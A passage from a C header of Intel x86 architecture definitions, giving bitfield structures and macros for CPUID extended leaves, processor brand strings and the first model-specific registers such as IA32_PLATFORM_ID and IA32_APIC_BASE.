#define CPUID_EBX_PAGE_ENTRIES_4MB_SUPPORTED_MASK                    0x01
#define CPUID_EBX_PAGE_ENTRIES_4MB_SUPPORTED(_)                      (((_) >> 2) & 0x01)

            /**
             * [Bit 3] 1 GB page size entries supported by this structure.
             */
            UINT32 PageEntries1GbSupported : 1;
#define CPUID_EBX_PAGE_ENTRIES_1GB_SUPPORTED_BIT                     3
#define CPUID_EBX_PAGE_ENTRIES_1GB_SUPPORTED_FLAG                    0x08
#define CPUID_EBX_PAGE_ENTRIES_1GB_SUPPORTED_MASK                    0x01
#define CPUID_EBX_PAGE_ENTRIES_1GB_SUPPORTED(_)                      (((_) >> 3) & 0x01)
            UINT32 Reserved1 : 4;

            /**
             * [Bits 10:8] Partitioning (0: Soft partitioning between the logical processors sharing this structure).
             */
            UINT32 Partitioning : 3;
#define CPUID_EBX_PARTITIONING_BIT                                   8
#define CPUID_EBX_PARTITIONING_FLAG                                  0x700
#define CPUID_EBX_PARTITIONING_MASK                                  0x07
#define CPUID_EBX_PARTITIONING(_)                                    (((_) >> 8) & 0x07)
            UINT32 Reserved2 : 5;

            /**
             * [Bits 31:16] W = Ways of associativity.
             */
            UINT32 WaysOfAssociativity01 : 16;
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_01_BIT                       16
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_01_FLAG                      0xFFFF0000
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_01_MASK                      0xFFFF
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_01(_)                        (((_) >> 16) & 0xFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Number of Sets.
             */
            UINT32 NumberOfSets : 32;
#define CPUID_ECX_NUMBER_OF_SETS_BIT                                 0
#define CPUID_ECX_NUMBER_OF_SETS_FLAG                                0xFFFFFFFF
#define CPUID_ECX_NUMBER_OF_SETS_MASK                                0xFFFFFFFF
#define CPUID_ECX_NUMBER_OF_SETS(_)                                  (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 4:0] Translation cache type field.
             * - 00000b: Null (indicates this sub-leaf is not valid).
             * - 00001b: Data TLB.
             * - 00010b: Instruction TLB.
             * - 00011b: Unified TLB.
             * All other encodings are reserved.
             *
             * @note Some unified TLBs will allow a single TLB entry to satisfy data read/write and instruction fetches. Others will
             *       require separate entries (e.g., one loaded on data read/write and another loaded on an instruction fetch) . Please see
             *       the Intel(R) 64 and IA-32 Architectures Optimization Reference Manual for details of a particular product.
             */
            UINT32 TranslationCacheTypeField : 5;
#define CPUID_EDX_TRANSLATION_CACHE_TYPE_FIELD_BIT                   0
#define CPUID_EDX_TRANSLATION_CACHE_TYPE_FIELD_FLAG                  0x1F
#define CPUID_EDX_TRANSLATION_CACHE_TYPE_FIELD_MASK                  0x1F
#define CPUID_EDX_TRANSLATION_CACHE_TYPE_FIELD(_)                    (((_) >> 0) & 0x1F)

            /**
             * [Bits 7:5] Translation cache level (starts at 1).
             */
            UINT32 TranslationCacheLevel : 3;
#define CPUID_EDX_TRANSLATION_CACHE_LEVEL_BIT                        5
#define CPUID_EDX_TRANSLATION_CACHE_LEVEL_FLAG                       0xE0
#define CPUID_EDX_TRANSLATION_CACHE_LEVEL_MASK                       0x07
#define CPUID_EDX_TRANSLATION_CACHE_LEVEL(_)                         (((_) >> 5) & 0x07)

            /**
             * [Bit 8] Fully associative structure.
             */
            UINT32 FullyAssociativeStructure : 1;
#define CPUID_EDX_FULLY_ASSOCIATIVE_STRUCTURE_BIT                    8
#define CPUID_EDX_FULLY_ASSOCIATIVE_STRUCTURE_FLAG                   0x100
#define CPUID_EDX_FULLY_ASSOCIATIVE_STRUCTURE_MASK                   0x01
#define CPUID_EDX_FULLY_ASSOCIATIVE_STRUCTURE(_)                     (((_) >> 8) & 0x01)
            UINT32 Reserved1 : 5;

            /**
             * [Bits 25:14] Maximum number of addressable IDs for logical processors sharing this translation cache.
             *
             * @note Add one to the return value to get the result.
             */
            UINT32 MaxAddressableIdsForLogicalProcessors : 12;
#define CPUID_EDX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS_BIT     14
#define CPUID_EDX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS_FLAG    0x3FFC000
#define CPUID_EDX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS_MASK    0xFFF
#define CPUID_EDX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS(_)      (((_) >> 14) & 0xFFF)
            UINT32 Reserved2 : 6;
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_18_ECX_01P;

/**
 * @}
 */


 /**
  * @brief Extended Function CPUID Information
  *
  * When CPUID executes with EAX set to 80000000H, the processor returns the highest value the processor recognizes for
  * returning extended processor information. The value is returned in the EAX register and is processor specific.
  */
#define CPUID_EXTENDED_FUNCTION_INFORMATION                          0x80000000
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] Maximum Input Value for Extended Function CPUID Information.
             */
            UINT32 MaxExtendedFunctions : 32;
#define CPUID_EAX_MAX_EXTENDED_FUNCTIONS_BIT                         0
#define CPUID_EAX_MAX_EXTENDED_FUNCTIONS_FLAG                        0xFFFFFFFF
#define CPUID_EAX_MAX_EXTENDED_FUNCTIONS_MASK                        0xFFFFFFFF
#define CPUID_EAX_MAX_EXTENDED_FUNCTIONS(_)                          (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] EBX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EBX_RESERVED_BIT                                       0
#define CPUID_EBX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EBX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EBX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] ECX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT                                       0
#define CPUID_ECX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] EDX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT                                       0
#define CPUID_EDX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_80000000;


/**
 * Extended Function CPUID Information.
 */
#define CPUID_EXTENDED_CPU_SIGNATURE                                 0x80000001
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] EAX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EAX_RESERVED_BIT                                       0
#define CPUID_EAX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EAX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EAX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] EBX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EBX_RESERVED_BIT                                       0
#define CPUID_EBX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EBX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EBX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bit 0] LAHF/SAHF available in 64-bit mode.
             */
            UINT32 LahfSahfAvailableIn64BitMode : 1;
#define CPUID_ECX_LAHF_SAHF_AVAILABLE_IN_64_BIT_MODE_BIT             0
#define CPUID_ECX_LAHF_SAHF_AVAILABLE_IN_64_BIT_MODE_FLAG            0x01
#define CPUID_ECX_LAHF_SAHF_AVAILABLE_IN_64_BIT_MODE_MASK            0x01
#define CPUID_ECX_LAHF_SAHF_AVAILABLE_IN_64_BIT_MODE(_)              (((_) >> 0) & 0x01)
            UINT32 Reserved1 : 4;

            /**
             * [Bit 5] LZCNT.
             */
            UINT32 Lzcnt : 1;
#define CPUID_ECX_LZCNT_BIT                                          5
#define CPUID_ECX_LZCNT_FLAG                                         0x20
#define CPUID_ECX_LZCNT_MASK                                         0x01
#define CPUID_ECX_LZCNT(_)                                           (((_) >> 5) & 0x01)
            UINT32 Reserved2 : 2;

            /**
             * [Bit 8] PREFETCHW.
             */
            UINT32 Prefetchw : 1;
#define CPUID_ECX_PREFETCHW_BIT                                      8
#define CPUID_ECX_PREFETCHW_FLAG                                     0x100
#define CPUID_ECX_PREFETCHW_MASK                                     0x01
#define CPUID_ECX_PREFETCHW(_)                                       (((_) >> 8) & 0x01)
            UINT32 Reserved3 : 23;
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            UINT32 Reserved1 : 11;

            /**
             * [Bit 11] SYSCALL/SYSRET available in 64-bit mode.
             */
            UINT32 SyscallSysretAvailableIn64BitMode : 1;
#define CPUID_EDX_SYSCALL_SYSRET_AVAILABLE_IN_64_BIT_MODE_BIT        11
#define CPUID_EDX_SYSCALL_SYSRET_AVAILABLE_IN_64_BIT_MODE_FLAG       0x800
#define CPUID_EDX_SYSCALL_SYSRET_AVAILABLE_IN_64_BIT_MODE_MASK       0x01
#define CPUID_EDX_SYSCALL_SYSRET_AVAILABLE_IN_64_BIT_MODE(_)         (((_) >> 11) & 0x01)
            UINT32 Reserved2 : 8;

            /**
             * [Bit 20] Execute Disable Bit available.
             */
            UINT32 ExecuteDisableBitAvailable : 1;
#define CPUID_EDX_EXECUTE_DISABLE_BIT_AVAILABLE_BIT                  20
#define CPUID_EDX_EXECUTE_DISABLE_BIT_AVAILABLE_FLAG                 0x100000
#define CPUID_EDX_EXECUTE_DISABLE_BIT_AVAILABLE_MASK                 0x01
#define CPUID_EDX_EXECUTE_DISABLE_BIT_AVAILABLE(_)                   (((_) >> 20) & 0x01)
            UINT32 Reserved3 : 5;

            /**
             * [Bit 26] 1-GByte pages are available if 1.
             */
            UINT32 Pages1GbAvailable : 1;
#define CPUID_EDX_PAGES_1GB_AVAILABLE_BIT                            26
#define CPUID_EDX_PAGES_1GB_AVAILABLE_FLAG                           0x4000000
#define CPUID_EDX_PAGES_1GB_AVAILABLE_MASK                           0x01
#define CPUID_EDX_PAGES_1GB_AVAILABLE(_)                             (((_) >> 26) & 0x01)

            /**
             * [Bit 27] RDTSCP and IA32_TSC_AUX are available if 1.
             */
            UINT32 RdtscpAvailable : 1;
#define CPUID_EDX_RDTSCP_AVAILABLE_BIT                               27
#define CPUID_EDX_RDTSCP_AVAILABLE_FLAG                              0x8000000
#define CPUID_EDX_RDTSCP_AVAILABLE_MASK                              0x01
#define CPUID_EDX_RDTSCP_AVAILABLE(_)                                (((_) >> 27) & 0x01)
            UINT32 Reserved4 : 1;

            /**
             * [Bit 29] Intel(R) 64 Architecture available if 1.
             */
            UINT32 Ia64Available : 1;
#define CPUID_EDX_IA64_AVAILABLE_BIT                                 29
#define CPUID_EDX_IA64_AVAILABLE_FLAG                                0x20000000
#define CPUID_EDX_IA64_AVAILABLE_MASK                                0x01
#define CPUID_EDX_IA64_AVAILABLE(_)                                  (((_) >> 29) & 0x01)
            UINT32 Reserved5 : 2;
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_80000001;


/**
 * Extended Function CPUID Information.
 */
#define CPUID_BRAND_STRING1                                          0x80000002

 /**
  * Extended Function CPUID Information.
  */
#define CPUID_BRAND_STRING2                                          0x80000003

  /**
   * Extended Function CPUID Information.
   */
#define CPUID_BRAND_STRING3                                          0x80000004
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] Processor Brand String.
             */
            UINT32 ProcessorBrandString1 : 32;
#define CPUID_EAX_PROCESSOR_BRAND_STRING_1_BIT                       0
#define CPUID_EAX_PROCESSOR_BRAND_STRING_1_FLAG                      0xFFFFFFFF
#define CPUID_EAX_PROCESSOR_BRAND_STRING_1_MASK                      0xFFFFFFFF
#define CPUID_EAX_PROCESSOR_BRAND_STRING_1(_)                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Processor Brand String Continued.
             */
            UINT32 ProcessorBrandString2 : 32;
#define CPUID_EBX_PROCESSOR_BRAND_STRING_2_BIT                       0
#define CPUID_EBX_PROCESSOR_BRAND_STRING_2_FLAG                      0xFFFFFFFF
#define CPUID_EBX_PROCESSOR_BRAND_STRING_2_MASK                      0xFFFFFFFF
#define CPUID_EBX_PROCESSOR_BRAND_STRING_2(_)                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Processor Brand String Continued.
             */
            UINT32 ProcessorBrandString3 : 32;
#define CPUID_ECX_PROCESSOR_BRAND_STRING_3_BIT                       0
#define CPUID_ECX_PROCESSOR_BRAND_STRING_3_FLAG                      0xFFFFFFFF
#define CPUID_ECX_PROCESSOR_BRAND_STRING_3_MASK                      0xFFFFFFFF
#define CPUID_ECX_PROCESSOR_BRAND_STRING_3(_)                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Processor Brand String Continued.
             */
            UINT32 ProcessorBrandString4 : 32;
#define CPUID_EDX_PROCESSOR_BRAND_STRING_4_BIT                       0
#define CPUID_EDX_PROCESSOR_BRAND_STRING_4_FLAG                      0xFFFFFFFF
#define CPUID_EDX_PROCESSOR_BRAND_STRING_4_MASK                      0xFFFFFFFF
#define CPUID_EDX_PROCESSOR_BRAND_STRING_4(_)                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_80000002;

/**
 * @brief Extended Function CPUID Information
 */
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] Processor Brand String Continued.
             */
            UINT32 ProcessorBrandString5 : 32;
#define CPUID_EAX_PROCESSOR_BRAND_STRING_5_BIT                       0
#define CPUID_EAX_PROCESSOR_BRAND_STRING_5_FLAG                      0xFFFFFFFF
#define CPUID_EAX_PROCESSOR_BRAND_STRING_5_MASK                      0xFFFFFFFF
#define CPUID_EAX_PROCESSOR_BRAND_STRING_5(_)                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Processor Brand String Continued.
             */
            UINT32 ProcessorBrandString6 : 32;
#define CPUID_EBX_PROCESSOR_BRAND_STRING_6_BIT                       0
#define CPUID_EBX_PROCESSOR_BRAND_STRING_6_FLAG                      0xFFFFFFFF
#define CPUID_EBX_PROCESSOR_BRAND_STRING_6_MASK                      0xFFFFFFFF
#define CPUID_EBX_PROCESSOR_BRAND_STRING_6(_)                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Processor Brand String Continued.
             */
            UINT32 ProcessorBrandString7 : 32;
#define CPUID_ECX_PROCESSOR_BRAND_STRING_7_BIT                       0
#define CPUID_ECX_PROCESSOR_BRAND_STRING_7_FLAG                      0xFFFFFFFF
#define CPUID_ECX_PROCESSOR_BRAND_STRING_7_MASK                      0xFFFFFFFF
#define CPUID_ECX_PROCESSOR_BRAND_STRING_7(_)                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Processor Brand String Continued.
             */
            UINT32 ProcessorBrandString8 : 32;
#define CPUID_EDX_PROCESSOR_BRAND_STRING_8_BIT                       0
#define CPUID_EDX_PROCESSOR_BRAND_STRING_8_FLAG                      0xFFFFFFFF
#define CPUID_EDX_PROCESSOR_BRAND_STRING_8_MASK                      0xFFFFFFFF
#define CPUID_EDX_PROCESSOR_BRAND_STRING_8(_)                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_80000003;

/**
 * @brief Extended Function CPUID Information
 */
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] Processor Brand String Continued.
             */
            UINT32 ProcessorBrandString9 : 32;
#define CPUID_EAX_PROCESSOR_BRAND_STRING_9_BIT                       0
#define CPUID_EAX_PROCESSOR_BRAND_STRING_9_FLAG                      0xFFFFFFFF
#define CPUID_EAX_PROCESSOR_BRAND_STRING_9_MASK                      0xFFFFFFFF
#define CPUID_EAX_PROCESSOR_BRAND_STRING_9(_)                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Processor Brand String Continued.
             */
            UINT32 ProcessorBrandString10 : 32;
#define CPUID_EBX_PROCESSOR_BRAND_STRING_10_BIT                      0
#define CPUID_EBX_PROCESSOR_BRAND_STRING_10_FLAG                     0xFFFFFFFF
#define CPUID_EBX_PROCESSOR_BRAND_STRING_10_MASK                     0xFFFFFFFF
#define CPUID_EBX_PROCESSOR_BRAND_STRING_10(_)                       (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Processor Brand String Continued.
             */
            UINT32 ProcessorBrandString11 : 32;
#define CPUID_ECX_PROCESSOR_BRAND_STRING_11_BIT                      0
#define CPUID_ECX_PROCESSOR_BRAND_STRING_11_FLAG                     0xFFFFFFFF
#define CPUID_ECX_PROCESSOR_BRAND_STRING_11_MASK                     0xFFFFFFFF
#define CPUID_ECX_PROCESSOR_BRAND_STRING_11(_)                       (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Processor Brand String Continued.
             */
            UINT32 ProcessorBrandString12 : 32;
#define CPUID_EDX_PROCESSOR_BRAND_STRING_12_BIT                      0
#define CPUID_EDX_PROCESSOR_BRAND_STRING_12_FLAG                     0xFFFFFFFF
#define CPUID_EDX_PROCESSOR_BRAND_STRING_12_MASK                     0xFFFFFFFF
#define CPUID_EDX_PROCESSOR_BRAND_STRING_12(_)                       (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_80000004;

/**
 * @brief Extended Function CPUID Information
 */
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] EAX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EAX_RESERVED_BIT                                       0
#define CPUID_EAX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EAX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EAX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] EBX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EBX_RESERVED_BIT                                       0
#define CPUID_EBX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EBX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EBX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] ECX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT                                       0
#define CPUID_ECX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] EDX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT                                       0
#define CPUID_EDX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_80000005;


/**
 * Extended Function CPUID Information.
 */
#define CPUID_EXTENDED_CACHE_INFO                                    0x80000006
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] EAX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EAX_RESERVED_BIT                                       0
#define CPUID_EAX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EAX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EAX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] EBX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EBX_RESERVED_BIT                                       0
#define CPUID_EBX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EBX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EBX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 7:0] Cache Line size in bytes.
             */
            UINT32 CacheLineSizeInBytes : 8;
#define CPUID_ECX_CACHE_LINE_SIZE_IN_BYTES_BIT                       0
#define CPUID_ECX_CACHE_LINE_SIZE_IN_BYTES_FLAG                      0xFF
#define CPUID_ECX_CACHE_LINE_SIZE_IN_BYTES_MASK                      0xFF
#define CPUID_ECX_CACHE_LINE_SIZE_IN_BYTES(_)                        (((_) >> 0) & 0xFF)
            UINT32 Reserved1 : 4;

            /**
             * [Bits 15:12] L2 Associativity field.
             * L2 associativity field encodings:
             * - 00H - Disabled.
             * - 01H - Direct mapped.
             * - 02H - 2-way.
             * - 04H - 4-way.
             * - 06H - 8-way.
             * - 08H - 16-way.
             * - 0FH - Fully associative.
             */
            UINT32 L2AssociativityField : 4;
#define CPUID_ECX_L2_ASSOCIATIVITY_FIELD_BIT                         12
#define CPUID_ECX_L2_ASSOCIATIVITY_FIELD_FLAG                        0xF000
#define CPUID_ECX_L2_ASSOCIATIVITY_FIELD_MASK                        0x0F
#define CPUID_ECX_L2_ASSOCIATIVITY_FIELD(_)                          (((_) >> 12) & 0x0F)

            /**
             * [Bits 31:16] Cache size in 1K units.
             */
            UINT32 CacheSizeIn1KUnits : 16;
#define CPUID_ECX_CACHE_SIZE_IN_1K_UNITS_BIT                         16
#define CPUID_ECX_CACHE_SIZE_IN_1K_UNITS_FLAG                        0xFFFF0000
#define CPUID_ECX_CACHE_SIZE_IN_1K_UNITS_MASK                        0xFFFF
#define CPUID_ECX_CACHE_SIZE_IN_1K_UNITS(_)                          (((_) >> 16) & 0xFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] EDX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT                                       0
#define CPUID_EDX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_80000006;


/**
 * Extended Function CPUID Information.
 */
#define CPUID_EXTENDED_TIME_STAMP_COUNTER                            0x80000007
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] EAX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EAX_RESERVED_BIT                                       0
#define CPUID_EAX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EAX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EAX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] EBX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EBX_RESERVED_BIT                                       0
#define CPUID_EBX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EBX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EBX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] ECX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT                                       0
#define CPUID_ECX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            UINT32 Reserved1 : 8;

            /**
             * [Bit 8] Invariant TSC available if 1.
             */
            UINT32 InvariantTscAvailable : 1;
#define CPUID_EDX_INVARIANT_TSC_AVAILABLE_BIT                        8
#define CPUID_EDX_INVARIANT_TSC_AVAILABLE_FLAG                       0x100
#define CPUID_EDX_INVARIANT_TSC_AVAILABLE_MASK                       0x01
#define CPUID_EDX_INVARIANT_TSC_AVAILABLE(_)                         (((_) >> 8) & 0x01)
            UINT32 Reserved2 : 23;
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_80000007;

/**
 * @}
 */

 /**
  * @defgroup MODEL_SPECIFIC_REGISTERS \
  *           Model Specific Registers
  *
  * @see Vol2A[3.2(CPUID)] (reference)
  * @{
  */
  /**
   * @defgroup IA32_P5_MC \
   *           IA32_P5_MC_(x)
   *
   * When machine-check exceptions are enabled for the Pentium processor (MCE flag is set in control register CR4), the
   * machine-check exception handler uses the RDMSR instruction to read the error type from the P5_MC_TYPE register and the
   * machine check address from the P5_MC_ADDR register. The handler then normally reports these register values to the
   * system console before aborting execution.
   *
   * @see Vol3B[15.10.2(Pentium Processor Machine-Check Exception Handling)] (reference)
   * @{
   */
   /**
    * Machine-check exception address.
    *
    * @remarks 05_01H
    * @see Vol4[2.22(MSRS IN PENTIUM PROCESSORS)]
    */
#define IA32_P5_MC_ADDR                                              0x00000000

    /**
     * Machine-check exception type.
     *
     * @remarks 05_01H
     * @see Vol4[2.22(MSRS IN PENTIUM PROCESSORS)]
     */
#define IA32_P5_MC_TYPE                                              0x00000001
     /**
      * @}
      */

      /**
       * System coherence line size.
       *
       * @remarks 0F_03H
       * @see Vol3A[8.10.5(Monitor/Mwait Address Range Determination)]
       * @see Vol3A[8.10.5(Monitor/Mwait Address Range Determination)] (reference)
       */
#define IA32_MONITOR_FILTER_LINE_SIZE                                0x00000006

       /**
        * Value as returned by instruction RDTSC.
        *
        * @remarks 05_01H
        * @see Vol3B[17.17(TIME-STAMP COUNTER)]
        */
#define IA32_TIME_STAMP_COUNTER                                      0x00000010

        /**
         * The operating system can use this MSR to determine "slot" information for the processor and the proper microcode update
         * to load.
         *
         * @remarks 06_01H
         */
#define IA32_PLATFORM_ID                                             0x00000017
typedef union
{
    struct
    {
        UINT64 Reserved1 : 50;

        /**
         * @brief Platform Id <b>(RO)</b>
         *
         * [Bits 52:50] Contains information concerning the intended platform for the processor.
         *
         *
         * 52 | 51 | 50 | _
         * --:|:--:|:---|-----------------
         * 0  | 0  | 0  | Processor Flag 0
         * 0  | 0  | 1  | Processor Flag 1
         * 0  | 1  | 0  | Processor Flag 2
         * 0  | 1  | 1  | Processor Flag 3
         * 1  | 0  | 0  | Processor Flag 4
         * 1  | 0  | 1  | Processor Flag 5
         * 1  | 1  | 0  | Processor Flag 6
         * 1  | 1  | 1  | Processor Flag 7
         */
        UINT64 PlatformId : 3;
#define IA32_PLATFORM_ID_PLATFORM_ID_BIT                             50
#define IA32_PLATFORM_ID_PLATFORM_ID_FLAG                            0x1C000000000000
#define IA32_PLATFORM_ID_PLATFORM_ID_MASK                            0x07
#define IA32_PLATFORM_ID_PLATFORM_ID(_)                              (((_) >> 50) & 0x07)
        UINT64 Reserved2 : 11;
    };

    UINT64 Flags;
} IA32_PLATFORM_ID_REGISTER;


/**
 * This register holds the APIC base address, permitting the relocation of the APIC memory map.
 *
 * @remarks 06_01H
 * @see Vol3A[10.4.4(Local APIC Status and Location)]
 * @see Vol3A[10.4.5(Relocating the Local APIC Registers)]
 */
#define IA32_APIC_BASE                                               0x0000001B
typedef union
{
    struct
    {
        UINT64 Reserved1 : 8;

        /**
         * [Bit 8] BSP flag.
         */
        UINT64 BspFlag : 1;
#define IA32_APIC_BASE_BSP_FLAG_BIT                                  8
#define IA32_APIC_BASE_BSP_FLAG_FLAG                                 0x100
#define IA32_APIC_BASE_BSP_FLAG_MASK                                 0x01
#define IA32_APIC_BASE_BSP_FLAG(_)                                   (((_) >> 8) & 0x01)
        UINT64 Reserved2 : 1;

        /**
         * [Bit 10] Enable x2APIC mode.
         */
        UINT64 EnableX2ApicMode : 1;
#define IA32_APIC_BASE_ENABLE_X2APIC_MODE_BIT                        10
#define IA32_APIC_BASE_ENABLE_X2APIC_MODE_FLAG                       0x400
#define IA32_APIC_BASE_ENABLE_X2APIC_MODE_MASK                       0x01
#define IA32_APIC_BASE_ENABLE_X2APIC_MODE(_)                         (((_) >> 10) & 0x01)

        /**
         * [Bit 11] APIC Global Enable.
         */
        UINT64 ApicGlobalEnable : 1;
